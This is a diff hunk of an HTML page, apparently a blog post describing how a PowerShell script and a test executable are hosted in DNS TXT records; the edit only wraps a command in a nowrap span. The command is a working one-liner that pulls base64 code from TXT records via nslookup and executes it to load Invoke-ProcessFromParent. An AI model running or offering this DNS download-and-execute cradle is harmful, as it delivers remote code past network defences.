@@ -23,7 +23,7 @@ I have a PowerShell script and a "Hello World" executable hosted at txt.pwnthein
 <ul>
    <li>PowerShell command to download and execute Invoke-ProcessFromParent
       <ul><br>
-         <li>.([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((((nslookup -q=txt ipfp.txt.pwntheinter.net) | Sort-Object | where { $_.startswith([char]9) }) -join "" -replace '\t"\d{1,}.|"', '')))))</li>
+         <li><span style="white-space: nowrap;">.([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((((nslookup -q=txt ipfp.txt.pwntheinter.net) | Sort-Object | where { $_.startswith([char]9) }) -join "" -replace '\t"\d{1,}.|"', '')))))</span></li>
       </ul><br>
    </li>
    <li>PowerShell command to download and write hello.exe to the current working directory
